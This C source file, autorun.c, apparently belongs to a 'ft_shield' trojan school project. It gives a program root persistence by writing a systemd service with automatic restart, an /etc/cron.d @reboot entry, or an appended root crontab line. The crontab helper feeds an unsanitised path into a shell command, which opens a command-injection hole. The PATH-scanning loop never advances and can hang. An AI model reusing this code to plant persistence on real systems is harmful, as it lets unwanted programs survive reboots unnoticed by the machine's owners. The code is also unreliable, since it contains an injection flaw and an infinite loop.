/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   autorun.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/25 15:17:39 by kiroussa          #+#    #+#             */
/*   Updated: 2025/11/19 04:15:38 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#if !MATT_MODE

#include <fcntl.h>
#include <shield.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define SYSTEMD_UNIT_P1 "\
[Unit]\n\
Description=ft_shield\n\
\n\
[Service]\n\
Type=simple\n\
ExecStart="
// This is where the full path to the binary will be located, since it's determined
// at runtime we can't hardcode it
#define SYSTEMD_UNIT_P2 "\n\
Restart=always\n\
RestartSec=5\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n\
"
#define SYSTEMD_UNIT_PATH "/etc/systemd/system/ft_shield.service"
#define CRONTAB_SERVICE_PATH "/etc/cron.d/ft_shield"

static inline int	is_systemd(void)
{
	return access("/run/systemd/system", F_OK) == 0;
}

static inline int	is_cron_d(void)
{
	return access("/etc/cron.d", F_OK) == 0;
}

static inline int	is_crontab(void)
{
	const char *path = getenv("PATH");
	if (!path || !*path)
		path = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
	char *our_path = calloc(strlen(path) + 1, sizeof(char));
	int found = 0;
	if (our_path)
	{
		strcpy(our_path, path);
		for (int i = 0; our_path[i]; i++)
		{
			if (our_path[i] == ':')
				our_path[i] = '\0';
		}
		char *curr = our_path;
		while (*curr)
		{
			char *next = calloc(strlen(curr) + strlen("/crontab") + 1, sizeof(char));
			if (next)
			{
				strcpy(next, curr);
				strcat(next, "/crontab");
				if (access(next, F_OK | X_OK) == 0)
					found = 1;
			}
			free(next);
			if (found)
				break ;
		}
	}
	free(our_path);
	return (found);
}

static inline int	write_systemd_unit(const char *binary_path)
{
	int fd = open(SYSTEMD_UNIT_PATH, O_CREAT | O_WRONLY, 0644);
	if (fd < 0)
		return (1);
	(void)!write(fd, SYSTEMD_UNIT_P1, strlen(SYSTEMD_UNIT_P1));
	(void)!write(fd, binary_path, strlen(binary_path));
	(void)!write(fd, SYSTEMD_UNIT_P2, strlen(SYSTEMD_UNIT_P2));
	close(fd);
	return (0);
}

static inline int	write_crontab_job(const char *schedule, const char *command) {
    char	cmd[1024];
    snprintf(cmd, sizeof(cmd), 
        "(crontab -u root -l 2>/dev/null; echo '%s %s') | crontab -u root -",
        schedule, command);
    
    return (system(cmd));
}

static inline int	write_crontab_d(const char *schedule, const char *command)
{
	int fd = open(CRONTAB_SERVICE_PATH, O_CREAT | O_WRONLY, 0644);
	if (fd < 0)
		return (1);
	(void)!write(fd, schedule, strlen(schedule));
	(void)!write(fd, " root ", 6);
	(void)!write(fd, command, strlen(command));
	(void)!write(fd, "\n", 1);
	(void)!close(fd);
	chmod(CRONTAB_SERVICE_PATH, 0644);
	return (0);
}

int	shield_autorun_setup(const char *binary_path)
{
	if (is_systemd())
	{
		write_systemd_unit(binary_path);
	}
	else if (is_cron_d())
	{
		write_crontab_d("@reboot", binary_path);
	}
	else if (is_crontab())
	{
		write_crontab_job("@reboot", binary_path);
	}
	return (1);
}

#endif // !MATT_MODE
